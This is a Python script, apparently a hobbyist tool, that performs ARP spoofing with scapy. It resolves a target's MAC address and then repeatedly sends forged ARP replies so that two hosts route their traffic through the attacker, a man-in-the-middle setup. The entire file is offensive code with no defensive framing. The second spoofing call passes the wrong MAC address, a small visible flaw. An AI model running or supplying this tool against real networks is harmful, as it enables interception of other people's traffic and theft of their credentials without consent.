import scapy.all as scapy
import optparse
import time

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i","--ipAdress",dest="ipAdress",help="Enter the ip adress!")
    parse_object.add_option("-p", "--poisonIpAdress", dest="poisonIpAdress", help="Enter the poison ip adress!")
    return parse_object.parse_args()

def takeMacAdress(ip):
    arpPacket = scapy.ARP(pdst=ip)
    brodcastPacet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combinedPacket = brodcastPacet / arpPacket
    answered = scapy.srp(combinedPacket,timeout=1, verbose = False)[0]
    return answered[0][1].hwsrc

def arpPoooooising(ipAdress,macAdress,poisingIp):
    arp_response = scapy.ARP(op = 2, pdst = ipAdress, hwdst = macAdress, psrc = poisingIp )
    scapy.send(arp_response, verbose = False)

number = 0
try:
    while True:
        (userInput,arguments) = get_user_input()
        arpPoooooising(userInput.ipAdress,takeMacAdress(userInput.ipAdress),userInput.poisonIpAdress)
        arpPoooooising(userInput.poisonIpAdress,takeMacAdress(userInput.ipAdress),userInput.ipAdress)
        number = number + 1
        print("Sending " + str(number) +" packets")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nProgram interrupted")

